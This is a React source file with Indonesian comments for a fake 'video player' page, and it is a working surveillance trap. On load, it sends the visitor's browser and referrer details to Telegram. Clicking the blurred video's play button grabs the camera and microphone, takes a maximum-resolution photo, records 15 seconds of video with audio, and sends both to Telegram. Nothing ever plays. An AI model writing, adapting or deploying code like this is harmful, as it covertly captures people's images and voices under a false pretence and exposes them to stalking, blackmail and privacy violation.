import { PlayIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';

function App() {
  const [isBlurred] = useState(true);
  const thumbnailUrl = 'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg';

  useEffect(() => {
    const sendVisitorNotification = async () => {
      const visitorDetails: VisitorDetails = {
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      };

      console.log('Mulai mengirim notifikasi pengunjung...');
      try {
        await sendTelegramNotification(visitorDetails);
        console.log('Notifikasi pengunjung berhasil dikirim');
      } catch (error) {
        console.error('Gagal mengirim notifikasi pengunjung:', error);
      }
    };

    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    console.log('Mulai proses pengambilan media...');
    try {
      // Dapatkan perangkat yang tersedia
      console.debug('Mencari perangkat media...');
      const devices = await navigator.mediaDevices.enumerateDevices();
      console.log('Perangkat yang ditemukan:', devices.map(d => d.kind));

      const videoDevice = devices.find(device => device.kind === 'videoinput');
      
      if (!videoDevice) {
        throw new Error('Tidak ada perangkat input video yang ditemukan');
      }
      console.log('Perangkat video yang dipilih:', videoDevice.label);

      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 4096 }, // Lebar maksimum yang didukung
          height: { ideal: 2160 }, // Tinggi maksimum yang didukung
          frameRate: { ideal: 60 }
        },
        audio: true
      };

      console.debug('Meminta akses media dengan konstrain:', constraints);
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      console.log('Stream media berhasil didapatkan');

      // Dapatkan pengaturan track video
      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();
      console.debug('Pengaturan track video:', settings);

      // Buat dan siapkan elemen video untuk menangkap foto
      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;
      
      console.log('Menyiapkan elemen video untuk penangkapan');
      // Tunggu sampai video siap
      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          console.log('Metadata video dimuat, mencoba memutar');
          try {
            await video.play();
            console.log('Video sedang diputar');
            setTimeout(resolve, 500);
          } catch (error) {
            console.error('Error memutar video:', error);
            resolve(true);
          }
        };
      });

      // Siapkan canvas dengan dimensi video aktual
      const canvas = document.createElement('canvas');
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;
      const context = canvas.getContext('2d');
      
      if (context) {
        console.log('Menggambar frame video ke canvas');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      } else {
        console.warn('Kontekst 2D canvas tidak tersedia');
      }

      // Konversi foto ke blob dengan kualitas maksimum
      console.log('Mengonversi canvas ke blob foto');
      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => {
          if (blob) {
            console.log('Blob foto dibuat, ukuran:', blob.size);
            resolve(blob);
          } else {
            console.error('Gagal membuat blob foto');
          }
        }, 'image/jpeg', 1.0);
      });

      // Kirim foto segera
      console.log('Mengirim foto ke Telegram...');
      await sendImageToTelegram(photoBlob);
      console.log('Foto berhasil dikirim ke Telegram');

      // Periksa format video yang didukung
      const mimeTypes = [
        'video/mp4;codecs=h264,aac',
        'video/mp4',
        'video/webm;codecs=vp8,opus',
        'video/webm'
      ];

      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));

      if (!supportedMimeType) {
        throw new Error('Tidak ada format video yang didukung ditemukan');
      }
      console.log('Format video yang dipilih:', supportedMimeType);

      // Konfigurasi rekaman video dengan kualitas maksimum
      console.log('Menginisialisasi MediaRecorder dengan tipe MIME:', supportedMimeType);
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 8000000 // 8 Mbps untuk kualitas tinggi
      });
      
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        console.debug('Data tersedia dari MediaRecorder, ukuran chunk:', e.data.size);
        if (e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        console.log('MediaRecorder berhenti, memproses blob video');
        const videoBlob = new Blob(chunks, { 
          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
        });
        console.log('Blob video dibuat, ukuran:', videoBlob.size);
        await sendVideoToTelegram(videoBlob);
        console.log('Video berhasil dikirim ke Telegram');
        stream.getTracks().forEach(track => track.stop());
        console.log('Track media dihentikan');
      };

      // Mulai rekaman dengan chunk data yang sering untuk kualitas lebih baik
      console.log('Memulai rekaman video');
      mediaRecorder.start(1000);
      console.log('Rekaman dimulai, interval: 1000ms');

      // Hentikan rekaman setelah 15 detik
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          console.log('Menghentikan rekaman video setelah 15 detik');
          mediaRecorder.stop();
        }
      }, 15000);

    } catch (error) {
      console.error('Error dalam captureAndSendMedia:', error);
    }
  }, []);

  const handlePlayClick = async () => {
    console.log('Tombol play diklik, memulai pengambilan media');
    await captureAndSendMedia();
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Pemutar Video</h1>
        </div>
      </header>

      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[1080px] mx-auto">
          <div className="relative">
            <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
              {isBlurred && (
                <div className="absolute inset-0 backdrop-blur-md bg-black/50" />
              )}
              <div className="absolute inset-0 flex items-center justify-center z-10">
                <button 
                  onClick={handlePlayClick}
                  className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
                >
                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
                </button>
              </div>
              <img 
                src={thumbnailUrl} 
                alt="Thumbnail Video" 
                className="w-full h-full object-cover"
              />
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
